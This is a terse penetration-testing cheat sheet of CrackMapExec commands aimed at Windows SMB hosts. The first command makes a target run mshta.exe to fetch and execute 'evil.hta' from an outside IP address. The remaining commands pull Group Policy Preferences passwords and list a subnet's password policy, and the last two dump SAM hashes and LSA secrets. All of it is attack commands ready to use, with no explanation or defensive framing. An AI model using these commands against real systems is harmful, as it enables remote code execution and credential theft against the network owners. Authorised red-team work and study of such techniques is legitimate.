- Execute HTA:
	- `cme smb IP_ADDRESS -u USERNAME -p 'PASSWORD' -x ‘mshta.exe http://10.6.190.60/evil.hta’`
- Get GPP policies
	- `cme smb DC_IPAddress -u ‘’ -p ‘’ -M gpp_autologin`
	- `cme smb DC_IPAddress -u ‘’ -p ‘’ -M gpp_password`
- Get password policy
	- `cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol`
- Dump SAM
	- `cme smb IPADDRESS -u UserName -p 'PASSWORDHERE' --sam`
- Dump LSA secrets
	- `cme smb IPADDRESS -u UserName -p 'PASSWORDHERE' --lsa`